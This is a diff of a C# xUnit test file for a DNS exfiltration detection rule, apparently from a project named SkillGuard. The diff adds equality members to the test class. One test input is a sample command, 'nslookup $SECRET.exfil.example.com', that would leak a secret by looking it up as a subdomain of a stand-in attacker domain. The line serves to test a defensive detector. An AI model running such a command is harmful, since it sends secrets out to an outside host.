@@ -4,9 +4,26 @@ using Xunit;
 
 namespace SkillGuard.Tests;
 
-public class DnsExfiltrationRuleTests
+public class DnsExfiltrationRuleTests : IEquatable<DnsExfiltrationRuleTests>
 {
     readonly DnsExfiltrationRule _rule = new();
+
+    public bool Equals(DnsExfiltrationRuleTests? other)
+    {
+        if (other is null) return false;
+        return EqualityComparer<DnsExfiltrationRule>.Default.Equals(_rule, other._rule);
+    }
+
+    public override bool Equals(object? obj) =>
+        Equals(obj as DnsExfiltrationRuleTests);
+
+    public override int GetHashCode() => HashCode.Combine(_rule);
+
+    public static bool operator ==(DnsExfiltrationRuleTests? left, DnsExfiltrationRuleTests? right) =>
+        EqualityComparer<DnsExfiltrationRuleTests>.Default.Equals(left, right);
+
+    public static bool operator !=(DnsExfiltrationRuleTests? left, DnsExfiltrationRuleTests? right) =>
+        !(left == right);
 
     [Theory]
     [InlineData("nslookup $SECRET.exfil.example.com")]
